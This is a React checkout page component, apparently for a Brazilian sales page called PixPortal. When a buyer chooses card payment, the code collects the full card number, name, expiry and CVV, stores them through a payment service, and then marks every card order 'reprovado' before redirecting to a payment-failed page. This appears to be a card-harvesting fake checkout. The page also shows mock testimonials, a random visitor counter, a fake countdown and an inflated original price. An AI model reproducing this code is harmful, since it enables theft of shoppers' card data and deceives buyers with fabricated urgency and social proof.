import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { formSchema } from './forms/checkoutFormSchema';
import { toast } from 'sonner';

import CheckoutHeader from './header/CheckoutHeader';
import ProductCard from './product/ProductCard';
import TestimonialsSection from './testimonials/TestimonialsSection';
import VisitorCounter from './visitors/VisitorCounter';
import { useCheckoutChecklist } from '@/hooks/useCheckoutChecklist';
import { mockTestimonials } from './data/mockTestimonials';
import { useOneCheckoutState } from './hooks/useOneCheckoutState';
import OneCheckoutForm from './one-checkout/OneCheckoutForm';
import OneCheckoutSidebar from './one-checkout/OneCheckoutSidebar';
import { Card, CardContent } from '@/components/ui/card';
import CheckoutFooter from './footer/CheckoutFooter';
import { useIsMobile } from '@/hooks/use-mobile';
import { supabase } from '@/integrations/supabase/client';
import { criarPagamento } from '@/services/pagamentoService';
import { atualizarStatusPedido } from '@/services/pedidoService';
import { getGlobalConfig } from '@/services/config/globalConfigService';

const API_URL = import.meta.env.VITE_API_URL || 'https://pix-portal-server.onrender.com';

interface OneCheckoutProps {
  producto: {
    id: string;
    nome: string;
    descricao?: string | null;
    preco: number;
    parcelas?: number;
    imagem_url?: string | null;
    slug?: string;
  };
  config?: any;
}

const OneCheckout: React.FC<OneCheckoutProps> = ({ producto, config = {} }) => {
  const navigate = useNavigate();
  const isMobile = useIsMobile();
  const {
    visitors,
    currentStep,
    setCurrentStep,
    isSubmitting,
    setIsSubmitting,
  } = useOneCheckoutState(config);

  const { checklistItems, updateChecklistItem } = useCheckoutChecklist();

  const {
    register,
    handleSubmit,
    formState: { errors },
    setValue,
    watch,
    trigger,
  } = useForm({
    resolver: zodResolver(formSchema),
    defaultValues: {
      payment_method: 'cartao',
      installments: '1x',
    },
    mode: 'onChange',
  });

  const currentPaymentMethod = watch('payment_method');

  const handlePaymentMethodChange = (method: 'pix' | 'cartao') => {
    setValue('payment_method', method);
    updateChecklistItem('payment-method', true);

    if (!isMobile && currentStep === 'personal-info') {
      trigger(['name', 'email', 'cpf', 'telefone'] as any).then((valid) => {
        if (valid) {
          setCurrentStep('payment-method');
          updateChecklistItem('personal-info', true);
        }
      });
    }
  };

  useEffect(() => {
    const subscription = watch((value, { name, type }) => {
      if (['name', 'email', 'cpf', 'telefone'].includes(name as string) && type === 'change') {
        trigger(['name', 'email', 'cpf', 'telefone'] as any).then((valid) => {
          if (valid) {
            updateChecklistItem('personal-info', true);
          }
        });
      }
      if (name === 'payment_method' && value.payment_method) {
        updateChecklistItem('payment-method', true);
      }
    });
    return () => subscription.unsubscribe();
  }, [watch, trigger, updateChecklistItem]);

  const handlePixPayment = async () => {
    try {
      setIsSubmitting(true);
      const configGlobal = await getGlobalConfig();
      const productIdentifier = producto.slug || producto.id;

      if (configGlobal?.usar_pix_assas && configGlobal.asaas_token) {
        toast.success('Gerando cobrança via Asaas...');

        const response = await fetch(`${API_URL}/api/asaas/criar-cobranca`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            customer: 'cus_xxxxxxxxx', // Substituir com ID válido do Asaas
            value: producto.preco,
            description: `Pagamento do produto ${producto.nome}`,
          }),
        });

        if (!response.ok) throw new Error('Erro ao gerar cobrança PIX');

        const cobranca = await response.json();
        console.log('Cobrança Asaas:', cobranca);

        navigate('/pix-asaas');
      } else {
        toast.success('Redirecionando para PIX manual');
        navigate(`/checkout/${productIdentifier}/pix`);
      }
    } catch (error) {
      console.error('Erro ao processar pagamento PIX:', error);
      toast.error('Erro ao processar pagamento PIX');
      setIsSubmitting(false);
    }
  };

  const onSubmit = async (data: any) => {
    setIsSubmitting(true);
    updateChecklistItem('confirm-payment', true);

    try {
      const productIdentifier = producto.slug || producto.id;

      if (data.payment_method === 'pix') {
        await handlePixPayment();
      } else {
        const produtoData = await supabase
          .from('produtos')
          .select('*')
          .eq('slug', productIdentifier)
          .maybeSingle();

        if (produtoData.error) throw new Error('Erro ao buscar produto');
        if (!produtoData.data) throw new Error('Produto não encontrado');

        const novoPedido = await supabase
          .from('pedidos')
          .insert({
            produto_id: produtoData.data.id,
            status: 'pendente',
            valor: produtoData.data.preco,
            nome: data.name,
            email: data.email,
            telefone: data.telefone,
            cpf: data.cpf,
            forma_pagamento: 'cartao',
          })
          .select()
          .single();

        if (novoPedido.error) throw new Error('Erro ao criar pedido');

        const parcelas = parseInt(data.installments.split('x')[0], 10);
        await criarPagamento({
          pedido_id: novoPedido.data.id,
          metodo_pagamento: 'cartao',
          numero_cartao: data.card_number,
          nome_cartao: data.card_name,
          validade: data.card_expiry,
          cvv: data.card_cvv,
          parcelas: parcelas,
        });

        await atualizarStatusPedido(novoPedido.data.id, 'reprovado');

        toast.success('Pagamento processado, redirecionando...');

        setTimeout(() => {
          navigate(`/checkout/${productIdentifier}/payment-failed/${novoPedido.data.id}`);
        }, 1500);
      }
    } catch (error: any) {
      console.error('Erro ao processar checkout:', error);
      toast.error('Erro no processamento', {
        description: 'Ocorreu um erro ao processar seu pedido. Por favor, tente novamente.',
      });
    } finally {
      setTimeout(() => {
        setIsSubmitting(false);
      }, 1500);
    }
  };

  const handleContinue = async () => {
    if (currentStep === 'personal-info') {
      const valid = await trigger(['name', 'email', 'cpf', 'telefone'] as any);
      if (valid) {
        setCurrentStep('payment-method');
        updateChecklistItem('personal-info', true);
      }
    } else if (currentStep === 'payment-method') {
      setCurrentStep('confirm');
    }
  };

  const maxInstallments = producto.parcelas || 1;
  const installmentOptions = Array.from({ length: maxInstallments }, (_, i) => i + 1).map((num) => ({
    value: `${num}x`,
    label: `${num}x de R$ ${(producto.preco / num).toFixed(2)}${num > 1 ? ' sem juros' : ''}`,
  }));

  return (
    <div className="w-full min-h-screen" style={{ backgroundColor: config?.cor_fundo || '#f5f5f7' }}>
      {config?.show_header !== false && (
        <CheckoutHeader
          message={config?.header_message || 'Tempo restante! Garanta sua oferta'}
          bgColor={config?.header_bg_color || '#000000'}
          textColor={config?.header_text_color || '#ffffff'}
        />
      )}

      <div className={`container max-w-4xl mx-auto ${isMobile ? 'py-3 px-3' : 'py-4 px-4 sm:px-6 sm:py-6'}`}>
        <ProductCard
          product={producto}
          discountEnabled={config?.discount_badge_enabled || false}
          discountText={config?.discount_badge_text || 'Oferta especial'}
          originalPrice={config?.original_price || producto.preco * 1.2}
        />

        <div className={`grid grid-cols-1 ${isMobile ? '' : 'md:grid-cols-3'} gap-6 mt-6`}>
          <div className={isMobile ? 'w-full' : 'md:col-span-2'}>
            <Card className="shadow-sm overflow-hidden">
              <div
                className="p-3 text-center"
                style={{
                  backgroundColor: config?.form_header_bg_color || '#dc2626',
                  color: config?.form_header_text_color || '#ffffff',
                }}
              >
                <h3 className="font-bold">{config?.form_header_text || 'PREENCHA SEUS DADOS ABAIXO'}</h3>
              </div>

              <CardContent className={isMobile ? 'p-3' : 'p-5'}>
                <OneCheckoutForm
                  register={register}
                  errors={errors}
                  handleSubmit={handleSubmit}
                  onSubmit={onSubmit}
                  currentStep={currentStep}
                  currentPaymentMethod={currentPaymentMethod}
                  handlePaymentMethodChange={handlePaymentMethodChange}
                  handleContinue={handleContinue}
                  setValue={setValue}
                  isSubmitting={isSubmitting}
                  installmentOptions={installmentOptions}
                  handlePixPayment={handlePixPayment}
                  paymentMethods={config?.payment_methods || ['pix', 'cartao']}
                  corBotao={config?.cor_botao || '#30b968'}
                  textoBotao={config?.texto_botao || 'Finalizar compra'}
                />
              </CardContent>
            </Card>
          </div>

          {!isMobile && <div className="order-first md:order-last"><OneCheckoutSidebar checklistItems={checklistItems} /></div>}
        </div>

        {config?.exibir_testemunhos !== false && (
          <TestimonialsSection testimonials={mockTestimonials} title={config?.testimonials_title || 'O que dizem nossos clientes'} />
        )}

        {config?.numero_aleatorio_visitas !== false && <VisitorCounter visitors={visitors} />}
      </div>

      <CheckoutFooter
        showFooter={config?.show_footer !== false}
        footerText={config?.footer_text || 'Todos os direitos reservados'}
        companyName={config?.company_name || 'PixPortal'}
        companyDescription={config?.company_description || 'Soluções de pagamento para aumentar suas vendas online.'}
        contactEmail={config?.contact_email || 'contato@pixportal.com.br'}
        contactPhone={config?.contact_phone || '(11) 99999-9999'}
        showTermsLink={config?.show_terms_link !== false}
        showPrivacyLink={config?.show_privacy_link !== false}
        termsUrl={config?.terms_url || '/termos'}
        privacyUrl={config?.privacy_url || '/privacidade'}
      />
    </div>
  );
};

export default OneCheckout;
